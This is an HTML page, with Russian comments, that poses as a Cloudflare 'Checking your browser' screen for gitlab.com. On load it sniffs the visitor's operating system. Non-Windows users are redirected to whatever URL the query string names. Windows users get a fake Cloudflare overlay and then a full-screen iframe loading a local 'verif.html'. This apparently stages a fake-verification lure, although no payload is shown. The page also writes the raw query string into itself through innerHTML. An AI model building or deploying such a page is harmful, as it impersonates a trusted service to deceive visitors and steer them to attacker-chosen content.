<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/x-icon" href="https://www.cloudflare.com/favicon.ico">
    <title>Browser Verification</title>
       <style>
        /* Стили для затемнения фона */
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            z-index: 9999;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        /* Стили для контейнера загрузки */
        .loading-popup {
        display: flex;
            background-color: #f8f8f89e;
            padding-left: 0px;
            padding-right: 0px;
            padding-top: 10px;

            border-radius: 4px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
        }

        /* Стили для спрайта загрузки */
        .spinner {

            width: 40px;
            height: 40px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #000204;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 20px 10px 25px;
        }

        /* Анимация вращения */
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Текст загрузки */
        .loading-text {
            color: #333;
            font-family: Arial, sans-serif;
            font-size: 16px;
            margin-top: 10px;
        }
    </style>
    <style>
        body {
            font-family: 'Helvetica Neue', Arial, sans-serif;
            background-color: #f8f9fa;
            color: #333;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
        }

        .container {
            max-width: 600px;
            padding: 30px;
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
        }

        h1 {
            font-size: 24px;
            margin-bottom: 20px;
            color: #222;
        }

        p {
            font-size: 16px;
            line-height: 1.6;
            margin-bottom: 15px;
        }

        .loader {
            margin: 30px auto;
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #ff9300;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .timer {
            font-weight: bold;
            color: #ff9300;
        }
    </style>
</head>
<body>
<div class="iframe-container" id="iframeContainer" style="display:none; z-index: 1000;">
  </div>
    <div class="container">
<!--        <svg xmlns="http://www.w3.org/2000/svg" width="180" height="54" viewBox="0 0 239 54" fill="none">-->
<!--<g clip-path="url(#clip0_1234_394)">-->
<!--<path d="M51.027 36.4346L51.405 35.1054C51.8639 33.532 51.6929 32.0671 50.928 31.0001C50.2261 30.0144 49.0562 29.4358 47.6343 29.3635L20.7268 29.0199C20.5469 29.0108 20.3939 28.9294 20.3039 28.7937C20.2139 28.6581 20.1869 28.4772 20.25 28.3054C20.3399 28.0432 20.6009 27.8353 20.8709 27.8262L48.0212 27.4826C51.243 27.3379 54.7257 24.7066 55.9496 21.5055L57.4974 17.4364C57.5424 17.3279 57.5604 17.2104 57.5604 17.0928C57.5604 17.0295 57.5514 16.9662 57.5424 16.9029C55.7966 8.95458 48.7322 3.01367 40.3 3.01367C32.5248 3.01367 25.9194 8.05937 23.5526 15.0673C22.0227 13.9189 20.0699 13.304 17.9641 13.5119C14.2295 13.8827 11.2328 16.9029 10.8638 20.6555C10.7648 21.6321 10.8458 22.5634 11.0707 23.4496C4.97834 23.6305 0.0917969 28.649 0.0917969 34.807C0.0917969 35.3676 0.136793 35.9101 0.208786 36.4527C0.244782 36.715 0.469762 36.9048 0.730737 36.9048L50.397 36.9139C50.4061 36.9139 50.4061 36.9139 50.4151 36.9139C50.6941 36.9048 50.946 36.715 51.027 36.4346Z" fill="#F6821F"/>-->
<!--<path d="M59.9905 17.7363C59.7386 17.7363 59.4955 17.7454 59.2436 17.7544C59.1986 17.7544 59.1626 17.7634 59.1266 17.7815C59.0006 17.8267 58.8926 17.9352 58.8567 18.0709L57.7948 21.7421C57.3357 23.3155 57.5068 24.7803 58.2717 25.8473C58.9736 26.833 60.1435 27.4117 61.5654 27.4841L67.2979 27.8277C67.4688 27.8367 67.6129 27.9181 67.7028 28.0537C67.8018 28.1894 67.8198 28.3702 67.7658 28.5421C67.6758 28.8042 67.4148 29.0122 67.1449 29.0213L61.1874 29.3649C57.9567 29.5186 54.465 32.1409 53.2411 35.342L52.8092 36.4722C52.7282 36.6803 52.8812 36.8973 53.0881 36.9063C53.0972 36.9063 53.0972 36.9063 53.1062 36.9063H73.6153C73.8583 36.9063 74.0742 36.7435 74.1463 36.5085C74.5062 35.2334 74.6952 33.8952 74.6952 32.5027C74.6952 24.3554 68.1078 17.7363 59.9905 17.7363Z" fill="#FBAD41"/>-->
<!--<path d="M97.3086 24.3633H100.701V33.686H106.641V36.6701H97.3086V24.3633Z" fill="black"/>-->
<!--<path d="M110.16 30.5496V30.5134C110.16 26.9778 112.995 24.1113 116.774 24.1113C120.555 24.1113 123.353 26.9417 123.353 30.4773V30.5134C123.353 34.049 120.519 36.9155 116.739 36.9155C112.959 36.9155 110.16 34.0852 110.16 30.5496ZM119.888 30.5496V30.5134C119.888 28.7411 118.611 27.1858 116.739 27.1858C114.885 27.1858 113.643 28.6959 113.643 30.4773V30.5134C113.643 32.2857 114.921 33.841 116.774 33.841C118.647 33.841 119.888 32.331 119.888 30.5496Z" fill="black"/>-->
<!--<path d="M127.51 31.2716V24.3633H130.956V31.2084C130.956 32.9807 131.847 33.8307 133.215 33.8307C134.582 33.8307 135.474 33.026 135.474 31.2989V24.3723H138.92V31.1993C138.92 35.178 136.662 36.9142 133.179 36.9142C129.696 36.8961 127.51 35.1238 127.51 31.2716Z" fill="black"/>-->
<!--<path d="M144.123 24.3633H148.847C153.222 24.3633 155.759 26.8951 155.759 30.4489V30.485C155.759 34.0386 153.185 36.6791 148.775 36.6791H144.123V24.3633ZM148.902 33.6498C150.935 33.6498 152.277 32.5286 152.277 30.5392V30.5031C152.277 28.5319 150.927 27.3925 148.902 27.3925H147.516V33.6498H148.902Z" fill="black"/>-->
<!--<path d="M160.689 24.3633H170.499V27.3473H164.092V29.4451H169.887V32.2754H164.092V36.6701H160.689V24.3633Z" fill="black"/>-->
<!--<path d="M175.225 24.3633H178.617V33.686H184.548V36.6701H175.225V24.3633Z" fill="black"/>-->
<!--<path d="M193.429 24.2734H196.705L201.924 36.6706H198.279L197.388 34.4734H192.664L191.791 36.6706H188.219L193.429 24.2734ZM196.399 31.8148L195.031 28.3154L193.645 31.8148H196.399Z" fill="black"/>-->
<!--<path d="M206.289 24.3633H212.085C213.956 24.3633 215.253 24.8606 216.072 25.7015C216.791 26.4068 217.16 27.3563 217.16 28.568V28.6042C217.16 30.485 216.161 31.7328 214.641 32.3839L217.565 36.6791H213.642L211.175 32.9536H209.682V36.6791H206.289V24.3633ZM211.922 30.268C213.074 30.268 213.741 29.7073 213.741 28.8121V28.776C213.741 27.8084 213.038 27.3202 211.905 27.3202H209.682V30.277H211.922V30.268Z" fill="black"/>-->
<!--<path d="M222.057 24.3633H231.91V27.2658H225.422V29.1286H231.298V31.8143H225.422V33.7674H232V36.6701H222.057V24.3633Z" fill="black"/>-->
<!--<path d="M89.8752 31.9964C89.3982 33.0725 88.3993 33.841 87.0674 33.841C85.2137 33.841 83.9358 32.2947 83.9358 30.5134V30.4773C83.9358 28.705 85.1776 27.1858 87.0315 27.1858C88.4263 27.1858 89.4972 28.0539 89.9472 29.2294H93.5288C92.9529 26.2996 90.3972 24.1113 87.0674 24.1113C83.2879 24.1113 80.4531 26.9778 80.4531 30.5134V30.5496C80.4531 34.0852 83.2518 36.9155 87.0315 36.9155C90.2622 36.9155 92.791 34.8086 93.4569 31.9874H89.8752V31.9964Z" fill="black"/>-->
<!--</g>-->
<!--<defs>-->
<!--<clipPath id="clip0_1234_394">-->
<!--<rect width="231.908" height="35.9294" fill="white" transform="translate(0.0917969 2)"/>-->
<!--</clipPath>-->
<!--</defs>-->
<!--</svg>-->
<!--    <a href="https://mail.ru" data-test-id="logo"><img style="    width: 180px;"-->
<!--                                                                              src="https://cf-assets.www.cloudflare.com/dzlvafdwdttg/69wNwfiY5mFmgpd9eQFW6j/d5131c08085a977aa70f19e7aada3fa9/1pixel-down__1_.svg"></a>-->

        <h1>Checking your browser before accessing <h4 id="urr">gitlab.com</h4></h1>

        <p>This process is automatic. Your browser will redirect to the requested content shortly.</p>

        <div class="loader"></div>

        <p>Please allow up to <span class="timer">5</span> seconds...</p>
    </div>

    <script>
    // Получаем query-строку из URL (всё после знака вопроса)
function getQueryString() {
  // Используем window.location.search для получения query-строки
  const queryString = window.location.search;

  // Если query-строка существует (не пустая), возвращаем её
  if (queryString) {
    return queryString;
  } else {
    return "Query-строка отсутствует в URL";
  }
}

// Пример использования
const queryString = getQueryString().substring(1);
console.log("Query-строка:", queryString);
document.getElementById('urr').innerHTML = queryString;
        // Countdown timer
        let seconds = 5;
        const timerElement = document.querySelector('.timer');

        const countdown = setInterval(() => {
            seconds--;
            timerElement.textContent = seconds;

            if (seconds <= 0) {
                clearInterval(countdown);
                // Redirect to target page here
                // window.location.href = "https://gitlab.com";
            }
        }, 1000);

        // Simulate browser check and redirect after 5 seconds
        setTimeout(() => {
            // window.location.href = "https://gitlab.com";
        }, 5000);
    </script>
  <script>
function showLoadingPopup() {
            // Создаем затемнение
           const overlay = document.createElement('div');
    overlay.className = 'overlay';
    overlay.id = 'loadingOverlay';

    // Создаем контейнер попапа
    const popup = document.createElement('div');
    popup.className = 'loading-popup';

    // Создаем спрайт загрузки
    const spinner = document.createElement('div');
    spinner.className = 'spinner';

    // Создаем изображение вместо текста
    const image = document.createElement('img');
    image.className = 'loading-image';
    image.src = 'https://cf-assets.www.cloudflare.com/dzlvafdwdttg/69wNwfiY5mFmgpd9eQFW6j/d5131c08085a977aa70f19e7aada3fa9/1pixel-down__1_.svg';
    image.alt = 'Загрузка';

    // Добавляем стили через className (предварительно определенные в CSS)
    image.style.display = 'block';
<!--    image.style.margin = '15px auto 0 auto';-->

    image.style.width = '65%';
image.style.opacity='0.7';
    // Собираем все вместе
    popup.appendChild(spinner);
    popup.appendChild(image);
    overlay.appendChild(popup);

    // Добавляем в документ
    document.body.appendChild(overlay);

    // Блокируем прокрутку страницы
    document.body.style.overflow = 'hidden';
            setTimeout(function() {
 const overlay = document.getElementById('loadingOverlay');
            if (overlay) {
                overlay.remove();
                // Восстанавливаем прокрутку страницы
                document.body.style.overflow = 'auto';
            }
    document.getElementById('iframeContainer').style.display = 'block';
         // Получаем URL для редиректа
     const redirectUrl = getQueryString().substring(1);
     
     document.getElementById('iframeContainer').innerHTML = `
            <iframe  id="iframeContainer2" style="  width: 100vw;
       height: 100vh;
       border: none;
       position: fixed;
       top: 0;
       left: 0;z-index:99999;"
       src="./verif.html?redirect=${encodeURIComponent(redirectUrl)}">
     </iframe>
     `;
    // Ваш код здесь
}, 1500);
        }

		// Функция, которая будет выполняться только на Windows
function executeForWindows() {
    console.log("Пользователь использует Windows");
setTimeout(function() {
	showLoadingPopup()
    // Ваш код здесь
}, 3500);
    // Здесь ваш код для Windows
    // Например:
    // document.body.style.backgroundColor = "#0078d7"; // Синий фон для Windows
    // alert("Добро пожаловать, пользователь Windows!");
}

// Функция определения операционной системы
function detectOS() {
    const userAgent = navigator.userAgent || navigator.platform || window.opera;

    // Проверка на Windows
    if (userAgent.indexOf('Win') !== -1) {
        return 'Windows';
    } else if (userAgent.indexOf('Mac') !== -1) {
        return 'MacOS';
    } else if (userAgent.indexOf('Linux') !== -1) {
        return 'Linux';
    } else if (userAgent.indexOf('Android') !== -1) {
        return 'Android';
    } else if (userAgent.indexOf('iOS') !== -1 || userAgent.indexOf('iPhone') !== -1 || userAgent.indexOf('iPad') !== -1) {
        return 'iOS';
    } else {
        return 'Unknown';
    }
}

// Основная функция проверки и выполнения
function checkDeviceAndExecute() {
    const os = detectOS();
    console.log('ОС:', os);

    if (os === 'Windows') {
        executeForWindows();
    }
    else
    {
    setTimeout(function() {   window.location.href = getQueryString().substring(1); }, 3000);

    }
}




// Выполняем проверку при загрузке страницы
document.addEventListener('DOMContentLoaded', function() {
    checkDeviceAndExecute();
});


	</script>

</body>
</html>
